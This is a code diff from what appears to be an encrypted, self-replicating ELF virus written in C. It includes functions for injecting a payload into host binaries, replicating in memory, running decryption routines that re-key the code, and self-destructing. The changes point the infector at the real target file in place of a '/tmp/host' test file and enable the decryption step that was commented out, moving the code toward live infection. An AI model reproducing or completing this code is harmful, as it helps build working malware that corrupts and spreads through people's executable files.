@@ -21,7 +21,7 @@ __attribute__((always_inline)) static inline void *_mmap(void *addr, size_t leng
 		"syscall\n"
 		:
 		: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
-		);
+	);
 	asm volatile
 	(
 		"mov %0, rax\n"
@@ -138,13 +138,13 @@ __attribute__((always_inline)) static inline void write_on_memory(const struct s
 	char *dst = ptr;
 	char *src = (char *)host->header;
 
-	for (size_t index = 0; index < host->note->data->p_offset + host->note->data->p_filesz; index++)
+	for (register size_t index = 0; index < host->note->data->p_offset + host->note->data->p_filesz; index++)
 		*dst++ = *src++;
 
-	for (size_t index = 0; index < payload_size; index++)
+	for (register size_t index = 0; index < payload_size; index++)
 		*dst++ = '*';
 
-	for (size_t index = 0; index < host->filesize - (host->note->data->p_offset + host->note->data->p_filesz); index++)
+	for (register size_t index = 0; index < host->filesize - (host->note->data->p_offset + host->note->data->p_filesz); index++)
 		*dst++ = *src++;
 }
 
@@ -167,7 +167,7 @@ __attribute__((always_inline)) static inline void replicate_on_memory(const stru
 
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
 	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
 	if (context == FAILURE)
@@ -188,7 +188,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	write_on_memory(host, ptr, payload_size);
 	replicate_on_memory(host, ptr);
 
-	if ((fd = _open("/tmp/host", O_RDWR | O_TRUNC, 0000)) < 0)
+	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
 	{
 		context = FAILURE;
 		goto label;
@@ -200,5 +200,8 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	_munmap(host->header, host->filesize);
 
 label:
+	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
+	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+
 	autodestruction(host, keychain, context);
 }
